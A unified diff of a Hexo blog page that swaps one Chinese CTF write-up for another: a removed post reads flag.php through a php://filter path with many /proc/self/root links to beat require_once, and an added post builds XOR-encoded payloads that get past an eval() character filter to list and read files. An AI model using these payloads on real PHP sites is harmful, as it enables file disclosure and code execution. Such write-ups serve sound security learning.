@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>[WMCTF2020]Make PHP Great Again | Hexo</title>
+  <title>[ISITDTU 2019]EasyPHP | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="打开后看到一小段代码&lt;?phphighlight_file(FILE);require_once ‘flag.php’;if(isset($_GET[‘file’])) {  require_once $_GET[‘file’];} 这里出现了require_oncerequire_once 表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则">
+  <meta name="description" content="打开靶机，便看到一段代码。&lt;?phphighlight_file(FILE); $_ &#x3D; @$GET[‘‘];if ( preg_match(‘&#x2F;[\x00- 0-9&#39;“&#96;$&amp;.,|[{defgops\x7F]+&#x2F;i’, $) )    die(‘rosé will not do it’); if ( strlen(count_chars">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[WMCTF2020]Make PHP Great Again">
-<meta property="og:url" content="http://example.com/2025/02/09/WMCTF2020-Make-PHP-Great-Again/index.html">
+<meta property="og:title" content="[ISITDTU 2019]EasyPHP">
+<meta property="og:url" content="http://example.com/2025/02/16/ISITDTU-2019-EasyPHP/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="打开后看到一小段代码&lt;?phphighlight_file(FILE);require_once ‘flag.php’;if(isset($_GET[‘file’])) {  require_once $_GET[‘file’];} 这里出现了require_oncerequire_once 表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则">
+<meta property="og:description" content="打开靶机，便看到一段代码。&lt;?phphighlight_file(FILE); $_ &#x3D; @$GET[‘‘];if ( preg_match(‘&#x2F;[\x00- 0-9&#39;“&#96;$&amp;.,|[{defgops\x7F]+&#x2F;i’, $) )    die(‘rosé will not do it’); if ( strlen(count_chars">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-02-09T12:53:34.000Z">
-<meta property="article:modified_time" content="2025-02-09T13:01:20.492Z">
+<meta property="article:published_time" content="2025-02-16T12:55:14.000Z">
+<meta property="article:modified_time" content="2025-02-16T13:08:02.186Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -71,10 +71,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-WMCTF2020-Make-PHP-Great-Again" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-ISITDTU-2019-EasyPHP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" class="article-date">
-  <time class="dt-published" datetime="2025-02-09T12:53:34.000Z" itemprop="datePublished">2025-02-09</time>
+    <a href="/2025/02/16/ISITDTU-2019-EasyPHP/" class="article-date">
+  <time class="dt-published" datetime="2025-02-16T12:55:14.000Z" itemprop="datePublished">2025-02-16</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      [WMCTF2020]Make PHP Great Again
+      [ISITDTU 2019]EasyPHP
     </h1>
   
 
@@ -93,17 +93,35 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>打开后看到一小段代码<br>&lt;?php<br>highlight_file(<strong>FILE</strong>);<br>require_once ‘flag.php’;<br>if(isset($_GET[‘file’])) {<br>  require_once $_GET[‘file’];<br>}</p>
-<p>这里出现了require_once<br>require_once 表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</p>
-<p>由于 require_once 包含的软链接层数较多时 once 的 hash 匹配会直接失效造成重复包含。</p>
-<p>由于已经包含过一次了，接下来就是绕过once再包含一次</p>
-<p>&#x2F;proc&#x2F;self&#x2F;是指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，而&#x2F;proc&#x2F;self&#x2F;root是指向&#x2F;的软连接，所以让软连接层数变多即可造成重复包含：<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
-<p>在url中输入便得到PD9waHAKCiRmbGFnID0gJ2ZsYWd7NjVkZDVhOTEtYzhlZC00Y2JiLWJhNjgtMGM3ODVjZTE1YTdhfSc7Cg&#x3D;&#x3D;<br>解码便可得到flag。</p>
+        <p>打开靶机，便看到一段代码。<br>&lt;?php<br>highlight_file(<strong>FILE</strong>);</p>
+<p>$_ &#x3D; @$<em>GET[‘</em>‘];<br>if ( preg_match(‘&#x2F;[\x00- 0-9&#39;“&#96;$&amp;.,|[{<em>defgops\x7F]+&#x2F;i’, $</em>) )<br>    die(‘rosé will not do it’);</p>
+<p>if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )<br>    die(‘you are so close, omg’);</p>
+<p>eval($_);<br>?&gt;<br>先进行代码审计，看到要绕过两个if。<br>先看一下第一个个if</p>
+<p>是一个正则匹配</p>
+<p>if ( preg_match(‘&#x2F;[\x00- 0-9&#39;“&#96;$&amp;.,|[{<em>defgops\x7F]+&#x2F;i’, $</em>) )<br>这里\x00- 0-9  匹配\x00到空格(\x20)，0-9的数字</p>
+<p>‘“&#96;$&amp;.,|[{_defgops  匹配这些字符</p>
+<p>\x7F 匹配del字符</p>
+<p>所以排除掉这些字符，我们可以用的字符有</p>
+<p>!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ]^abchijklmnqrtuvwxyz}~<br>第二个if</p>
+<p>if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )<br>当mode为3时，可以来测试一下<br>所以这句话的意思就是所使用的字符种类不能超过13种</p>
+<p> 可以从第一个if发现没有过滤掉~和^</p>
+<p>就可以用异或绕过或者反编码绕过<br> 基本上能够使用的函数的都被禁了</p>
+<p>这里还可以使用print_r(scandir(.))来查看文件夹</p>
+<p> 但是直接异或出来的payload不能够直接使用<br>用的是a^b^c&#x3D;d,把a^b^c替换原来的d，再和%ff异或。<br>即原来的d^%ff &#x3D; a^b^c^%ff</p>
+<p>最后得出了</p>
+<p>((%ff%ff%ff%ff%ff%ff%ff)^(%8b%9c%9b%8b%8b%8b%9c)^(%8b%8f%9c%8b%9b%8b%8f)^(%8f%9e%91%91%9b%a0%9e))(((%8b%8b%8b%8b%8b%9b%9c)^(%9b%8b%8b%8b%8b%9c%8f)^(%9c%9c%9e%91%9b%91%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));<br>&lt;?php<br>highlight_file(<strong>FILE</strong>);</p>
+<p>$_ &#x3D; @$<em>GET[‘</em>‘];<br>if ( preg_match(‘&#x2F;[\x00- 0-9&#39;“&#96;$&amp;.,|[{<em>defgops\x7F]+&#x2F;i’, $</em>) )<br>    die(‘rosé will not do it’);</p>
+<p>if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )<br>    die(‘you are so close, omg’);</p>
+<p>eval($_);<br>?&gt;<br>rosé will not do it<br>可以看出flag就在后面的这个txt中</p>
+<p>因为这个文件名太长了，可能会报错，而且又在数组的最后一个</p>
+<p>所以使用readfile(end(scandir(.)))</p>
+<p>再构建出获取flag的payload</p>
+<p>?_&#x3D;((%8d%8d%8d%8d%8d%8d%9e%8d)^(%9a%8d%8d%8d%8d%8d%9b%8d)^(%9a%9a%9e%9b%99%96%96%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%8d%9e%8d)^(%8d%99%8d)^(%9a%96%9b)^(%ff%ff%ff))(((%8d%9e%8d%9e%8d%8d%8d)^(%9a%9b%8d%99%8d%8d%9a)^(%9b%99%9e%96%9b%96%9a)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));<br>便可得到flag flag{dec997a2-a472-49dc-b294-391ffd8dde87}</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" data-id="cm6xmv56t0000qcx17a6p1jfm" data-title="[WMCTF2020]Make PHP Great Again" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/02/16/ISITDTU-2019-EasyPHP/" data-id="cm77n1l8l0000u0x18ugv6d27" data-title="[ISITDTU 2019]EasyPHP" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -113,19 +131,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2025/02/16/De1CTF-2019-SSRF-Me1/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          [De1CTF 2019]SSRF Me1
-        
-      </div>
-    </a>
   
-  
-    <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2025/02/16/De1CTF-2019-SSRF-Me1/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">[红明谷CTF 2021]write_shell</div>
+      <div class="article-nav-title">[De1CTF 2019]SSRF Me1</div>
     </a>
   
 </nav>
